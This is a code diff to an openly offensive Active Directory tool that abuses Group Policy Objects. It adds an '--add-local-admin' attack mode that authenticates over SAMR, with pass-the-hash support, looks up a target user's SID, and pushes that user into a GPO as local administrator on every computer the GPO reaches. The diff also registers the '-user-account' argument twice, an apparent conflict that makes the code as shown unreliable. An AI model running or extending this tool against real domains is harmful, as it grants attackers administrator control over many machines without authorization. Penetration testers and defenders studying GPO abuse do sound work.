@@ -41,6 +41,7 @@ parser.add_argument('-ccache', action='store', help='ccache file name (must be i
 attack_type = parser.add_mutually_exclusive_group(required=True)
 attack_type.add_argument('--add-rights', action='store_true', help='Add rights to a user')
 attack_type.add_argument('--add-task', action='store_true', help='Add ScheduledTask to GPO')
+attack_type.add_argument('--add-local-admin', action='store_true', help='Add user to the local administrators group')
 attack_type.add_argument('--backup-gpo', action='store_true', help='Backup a GPO before modification')
 attack_type.add_argument('--restore-gpo', action='store_true', help='Restore a GPO from backup')
 
@@ -48,6 +49,10 @@ attack_type.add_argument('--restore-gpo', action='store_true', help='Restore a G
 rights_group = parser.add_argument_group('User Rights arguments (use with --add-rights)')
 rights_group.add_argument('-rights', action='store', help='Comma-separated list of rights to assign')
 rights_group.add_argument('-user-account', action='store', help='User account to assign rights to')
+
+# Local Admin arguments
+admin_group = parser.add_argument_group('Local Admin arguments (use with --add-local-admin)')
+admin_group.add_argument('-user-account', action='store', help='User account to add as local administrator')
 
 # Scheduled Task arguments
 task_group = parser.add_argument_group('ScheduledTask arguments (use with --add-task)')
@@ -235,6 +240,79 @@ try:
                     sys.exit(1)
             else:
                 logging.error("Failed to add user rights")
+                sys.exit(1)
+                
+        except Exception as e:
+            logging.error("Error while getting user SID", exc_info=True)
+            sys.exit(1)
+            
+    elif options.add_local_admin:
+        # Check required parameters for adding local admin
+        if not options.user_account:
+            logging.error("User account must be specified with -user-account parameter")
+            sys.exit(1)
+            
+        # Get SID of the user account
+        from impacket.dcerpc.v5 import samr, transport
+        rpctransport = transport.SMBTransport(dc_ip, filename=r'\samr')
+        if options.k:
+            rpctransport.set_kerberos(True, options.dc_ip)
+        if options.hashes:
+            lmhash, nthash = options.hashes.split(':')
+            rpctransport.set_credentials(username, '', domain, lmhash, nthash, None)
+        else:
+            rpctransport.set_credentials(username, password, domain, '', '', None)
+            
+        dce = rpctransport.get_dce_rpc()
+        dce.connect()
+        dce.bind(samr.MSRPC_UUID_SAMR)
+        
+        logging.debug("Connected to SAMR")
+        
+        try:
+            resp = samr.hSamrConnect(dce)
+            server_handle = resp['ServerHandle']
+            
+            resp = samr.hSamrLookupDomainInSamServer(dce, server_handle, domain)
+            domain_sid = resp['DomainId']
+            
+            resp = samr.hSamrOpenDomain(dce, server_handle, domainId=domain_sid)
+            domain_handle = resp['DomainHandle']
+            
+            resp = samr.hSamrLookupNamesInDomain(dce, domain_handle, [options.user_account])
+            user_rid = resp['RelativeIds']['Element'][0]
+            
+            resp = samr.hSamrOpenUser(dce, domain_handle, desiredAccess=samr.MAXIMUM_ALLOWED, userId=user_rid)
+            user_handle = resp['UserHandle']
+            
+            resp = samr.hSamrQueryInformationUser(dce, user_handle, samr.USER_INFORMATION_CLASS.UserAllInformation)
+            user_sid = domain_sid.formatCanonical() + "-" + str(user_rid)
+            
+            logging.info("User SID for {} is {}".format(options.user_account, user_sid))
+            
+            # Close handles
+            samr.hSamrCloseHandle(dce, user_handle)
+            samr.hSamrCloseHandle(dce, domain_handle)
+            samr.hSamrCloseHandle(dce, server_handle)
+            
+            # Add local admin
+            success = gpo.add_local_admin(
+                domain=domain,
+                gpo_id=options.gpo_id,
+                username=options.user_account,
+                sid=user_sid,
+                force=options.f
+            )
+            
+            if success:
+                if gpo.update_versions(url, domain, options.gpo_id, gpo_type="computer"):  # Local admin is always computer GPO
+                    logging.info("Version updated")
+                    logging.success("User {} successfully added as local administrator!".format(options.user_account))
+                else:
+                    logging.error("Error while updating versions")
+                    sys.exit(1)
+            else:
+                logging.error("Failed to add local admin")
                 sys.exit(1)
                 
         except Exception as e:
